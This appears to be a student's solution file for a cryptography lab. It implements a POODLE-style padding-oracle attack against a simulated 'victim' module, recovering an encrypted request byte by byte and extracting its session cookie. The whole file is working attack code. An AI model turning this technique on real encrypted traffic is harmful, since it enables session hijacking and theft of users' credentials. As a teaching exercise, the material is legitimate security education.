from victim import get_request, send_request, check_solution
import requests

def main():
    ########## ↓↓↓ WORK ONLY HERE ↓↓↓  ##########
    length = find_length()
    decrypted_request = list("-" * len(get_request("", "")))
    for i in range(1, (len(decrypted_request) + length) // 16):
        find_block(i, length, decrypted_request)
    index = decrypted_request.index("=")
    cookie = "".join(decrypted_request[index + 1 : index + 33])
    ########## ↑↑↑ WORK ONLY HERE ↑↑↑  ##########

    print(check_solution())

########## ↓↓↓ FEEL FREE TO ADD FUNCTIONS ↓↓↓  ##########

def find_length():
    path = ""
    data = ""
    original_length = len(get_request(path, data))
    length = original_length
    while length == original_length:
        path += "a"
        length = len(get_request(path, data))
    return len(path)


def find_block(index: int, length: int, decrypted_request: list):
    print("finding block number " , index)
    sum_counts = 0
    for i in range(16):
        path = "a" * i
        data = "a" * (length - i + 16)
        response = False
        counter = 0
        while not response or response.status_code != 200:
            request = get_request(path, data)
            edited_request = request[:-16] + request[index * 16 : (index + 1) * 16]
            response = send_request(edited_request)
            counter += 1
        decrypted_byte = request[index * 16 - 1] ^ 16 ^ request[-17]
        print(f"found byte after {counter} requests: ", decrypted_byte)
        decrypted_request[(index + 1) * 16 - i - 1] = chr(decrypted_byte)
        sum_counts += counter
    print("".join(decrypted_request))
    print("Avarage requests count per byte: ", sum_counts / 16)

########## ↑↑↑ END OF CODE ↑↑↑  ##########

if __name__ == "__main__":
    main()